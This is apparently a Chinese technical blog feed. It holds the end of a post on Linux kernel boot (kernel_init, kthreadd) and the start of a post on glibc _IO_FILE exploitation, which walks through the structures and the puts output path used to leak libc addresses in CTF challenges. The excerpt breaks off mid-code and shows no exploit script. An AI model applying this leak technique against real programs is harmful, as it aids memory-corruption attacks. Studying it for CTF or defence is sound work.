ret;</span><br><span class="line"></span><br><span class="line">kernel_init_freeable();</span><br><span class="line"><span class="comment">/* need to finish all async __init code before freeing the memory */</span></span><br><span class="line">async_synchronize_full();</span><br><span class="line">free_initmem();</span><br><span class="line">mark_rodata_ro();</span><br><span class="line">system_state = SYSTEM_RUNNING;</span><br><span class="line">numa_default_policy();</span><br><span class="line"></span><br><span class="line">flush_delayed_fput();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ramdisk_execute_command) &#123;</span><br><span class="line">ret = run_init_process(ramdisk_execute_command);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">pr_err(<span class="string">&quot;Failed to execute %s (error %d)\n&quot;</span>,</span><br><span class="line">       ramdisk_execute_command, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We try each of these until one succeeds.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The Bourne shell can be used instead of init if we are</span></span><br><span class="line"><span class="comment"> * trying to recover a really broken machine.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (execute_command) &#123;</span><br><span class="line">ret = run_init_process(execute_command);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">pr_err(<span class="string">&quot;Failed to execute %s (error %d).  Attempting defaults...\n&quot;</span>,</span><br><span class="line">execute_command, ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!try_to_run_init_process(<span class="string">&quot;/sbin/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/etc/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/bin/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">panic(<span class="string">&quot;No working init found.  Try passing init= option to kernel. &quot;</span></span><br><span class="line">      <span class="string">&quot;See Linux Documentation/init.txt for guidance.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那它是怎么转换的呢？答：直接去用户态进程找到一个<code>init</code>进程并启动它，要找到用户态进程那首先就得挂载文件系统吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ramdisk_execute_command) &#123;</span><br><span class="line">ret = run_init_process(ramdisk_execute_command);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">pr_err(<span class="string">&quot;Failed to execute %s (error %d)\n&quot;</span>,ramdisk_execute_command, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挂载完成之后，如果在命令行中有指定<code>init</code>的程序就去执行这个，如果没有就去一些固定的目录去找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (execute_command) &#123;</span><br><span class="line">    ret = run_init_process(execute_command);</span><br><span class="line">    <span class="keyword">if</span> (!ret)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    pr_err(<span class="string">&quot;Failed to execute %s (error %d).  Attempting defaults...\n&quot;</span>,</span><br><span class="line">           execute_command, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始寻找用户态的文件系统中的<code>init</code>进程，只要这四个只要一个就可以了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!try_to_run_init_process(<span class="string">&quot;/sbin/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/etc/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/bin/init&quot;</span>) ||</span><br><span class="line">    !try_to_run_init_process(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h5 id="kthreadd"><a href="#kthreadd" class="headerlink" title="kthreadd"></a>kthreadd</h5><p><code>kthreadd</code>的本地就是运行在内核态的死循环，它会不断遍历<code>kthread_create_list</code>来查看是否有需要创建的线程，这个进程是linux内核的守护进程，它的作用是管理调度其他内核进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kthreadd</span><span class="params">(<span class="keyword">void</span> *unused)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span> =</span> current;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Setup a clean context for our children to inherit. */</span></span><br><span class="line">set_task_comm(tsk, <span class="string">&quot;kthreadd&quot;</span>);</span><br><span class="line">ignore_signals(tsk);</span><br><span class="line">set_cpus_allowed_ptr(tsk, cpu_all_mask);<span class="comment">//运行kthreadd在任意CPU运行</span></span><br><span class="line">set_mems_allowed(node_states[N_MEMORY]);</span><br><span class="line"> </span><br><span class="line">current-&gt;flags |= PF_NOFREEZE;</span><br><span class="line">cgroup_init_kthreadd();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//设置当前进程状态为TASK_INTERRUPTIBLE，</span></span><br><span class="line">set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">        <span class="comment">//查找kthread_create_list列表中 是否有新需创建的线程，如果没有让出CPU，进入睡眠</span></span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;kthread_create_list))</span><br><span class="line">schedule();</span><br><span class="line">        <span class="comment">//如果有要创建的线程，设置当前进程状态为TASK_INTERRUPTIBLE 运行态</span></span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line">        <span class="comment">//spin_lock自旋锁，不可睡眠</span></span><br><span class="line">spin_lock(&amp;kthread_create_lock);</span><br><span class="line">        <span class="comment">//查找kthread_create_list列表</span></span><br><span class="line"><span class="keyword">while</span> (!list_empty(&amp;kthread_create_list)) &#123;</span><br><span class="line">            <span class="comment">//kthread_info</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kthread_create_info</span> *<span class="title">create</span>;</span></span><br><span class="line">            <span class="comment">//从kthread_create_list中取出要创建线程的信息</span></span><br><span class="line">create = list_entry(kthread_create_list.next,</span><br><span class="line">    struct kthread_create_info, <span class="built_in">list</span>);</span><br><span class="line">            <span class="comment">//从列表中删除要创建的线程</span></span><br><span class="line">list_del_init(&amp;create-&gt;<span class="built_in">list</span>);</span><br><span class="line">            <span class="comment">//spin_unlock 解锁</span></span><br><span class="line">spin_unlock(&amp;kthread_create_lock);</span><br><span class="line">            <span class="comment">//创建线程</span></span><br><span class="line">create_kthread(create);</span><br><span class="line">            <span class="comment">//spin_lock自旋锁，不可睡眠   </span></span><br><span class="line">spin_lock(&amp;kthread_create_lock);</span><br><span class="line">&#125;</span><br><span class="line">         <span class="comment">//spin_unlock 解锁</span></span><br><span class="line">spin_unlock(&amp;kthread_create_lock);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>自此回看之前的问题，再总结一下：</p><ul><li><code>idle</code>进程是什么，它是怎么来的，它的作用是什么？</li></ul><p><code>idle</code>进程其实就是<code>start_kernel</code>最开始创建的进程—-<code>init_task</code>，通过<code>cpu_idle()</code>函数将<code>init_task</code>转化成<code>idle</code>进程，其实就是0号进程在不同时间段中不同的状态</p><ul><li>0号进程是什么？1号呢？2号呢？1号进程和2号进程的作用又是什么呢？</li></ul><p>0号进程为<code>init_task/idle</code>，1号进程为<code>init</code>进程，2号进程为<code>kthreadd</code>，更详细的介绍可以看看下面的系列：</p><p><a href="https://blog.csdn.net/mahang123456/article/details/88722948?spm=1001.2014.3001.5501">Android 8.0 开机流程 (一) Linux内核启动过程</a></p><p><a href="https://blog.csdn.net/mahang123456/article/details/88732420?spm=1001.2014.3001.5501">Android 8.0 开机流程 (二) Linux 内核kthreadd进程的启动</a></p><p><a href="https://blog.csdn.net/mahang123456/article/details/88741650?spm=1001.2014.3001.5501">Android 8.0 开机流程 (三) Linux 内核 init 进程的启动</a></p><ul><li>内核启动完成以后处于一个什么状态当中？</li></ul><p>处于一个死循环当中，保证操作系统能正常的运行</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cxyzjd.com/article/zhongyhc/8842478">linux启动流程（从start_kernel中的rest_init函数到init进程（1）</a></p><p><a href="https://blog.csdn.net/lushoumin/article/details/85330185">linux内核rest_init分析</a></p><p><a href="https://blog.csdn.net/notbaron/article/details/80033417">start_kernel启动函数——简版</a></p><p>[Linux 3.2.8 内核启动过程](</p>]]></content>
      
      
      <categories>
          
          <category> 内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux文件流攻击 -- _IO_FILE攻击</title>
      <link href="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/"/>
      <url>/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>_IO_FILE</code>攻击从<code>exp</code>中来看很简单，但其背后的含有并不简单，可以用复杂来形容，也很模板化，在比赛中有几种比较常见的形式，除了<code>House of orange</code>，还有用它来泄露<code>libc</code>地址（此文章重点讲解），接下来一起来看看，动手调一调，给自己留个深刻的印象</p></blockquote><h4 id="IO-FILE到底是个啥？"><a href="#IO-FILE到底是个啥？" class="headerlink" title="_IO_FILE到底是个啥？"></a>_IO_FILE到底是个啥？</h4><p>在一开始接触这个东西的时候，真的是一头雾水，各种结构体，晕头转向，其实IO_FILE的本质就是三个基本的文件流，<code>stdin、stdout、stderr</code>，这三个东西我们应该很常见，标准输入，标准输出，标准错误，在程序初始化的时候就已经默认生成好了，所以在通常情况下，我们再打开一个文件流的<code>fd</code>为<code>3</code>，那么这些文件流是通过什么来索引的呢？答：<code>IO_list_all</code>会通过单项列表保存所有的文件流：</p><img src="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/1.png" class=""><p><code>_IO_FILE</code>的源码在<code>/usr/include/x86_64-linux-gnu/bits/libio.h</code>或者<code>libio/libio.h</code>，可以去看看，里面有各种各样的IO函数，但我们只关注<code>_IO_FILE</code>相关的函数，下面是<code>_IO_FILE</code>的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  ...<span class="comment">//下面为一些宏</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>_IO_FILE</code>下面可以看到它的老爸<code>_IO_FILE_plus</code>，但并没有它的函数定义，定义在<code>libio/libioP.h</code>里面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span><span class="comment">//虚函数表</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE file</code>就是刚刚的那个结构体，<code>_IO_jump_t</code>如下，此虚表在<code>House of orange</code>用的比较多：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE file</code>大体就这样，可以考察下面的链接再加深一下：</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">好好说话之IO_FILE利用（1）：利用_IO_2_1_stdout泄露libc</a></p><p><a href="https://la13x.github.io/2021/07/27/IO-FILE/#fopen">IO_FILE相关利用</a></p><p><a href="http://blog.ivan0.com/2018/11/19/IO_FILE/">IO_FILE</a></p><p>接下来就是利用<code>_IO_FILE</code>泄露<code>libc</code>的原理</p><h4 id="如何用-IO-FILE泄露libc"><a href="#如何用-IO-FILE泄露libc" class="headerlink" title="如何用_IO_FILE泄露libc"></a>如何用_IO_FILE泄露libc</h4><blockquote><p>泄露的本质只是利用它原来的输出，只是可以任意地址写了之后改写了一些参数，让它本来的输出呈现出不一样的结果罢了！</p></blockquote><p>下面就用<code>puts</code>函数来讲解，如何构造一些巧妙的值来达到泄露<code>libc</code>目的，<code>puts</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用这么多函数最终是调用了<code>vtable</code>中的<code> JUMP_FIELD(_IO_xsputn_t, __xsputn);</code>，动态的结果也是这样（好像动调的前面都有个<code>_file</code>）：</p><img src="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/2.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>接下来就是<code>_IO_OVERFLOW</code>，进到<code>_IO_OVERFLOW</code>就是泄露的重点了！</p><img src="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/3.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || 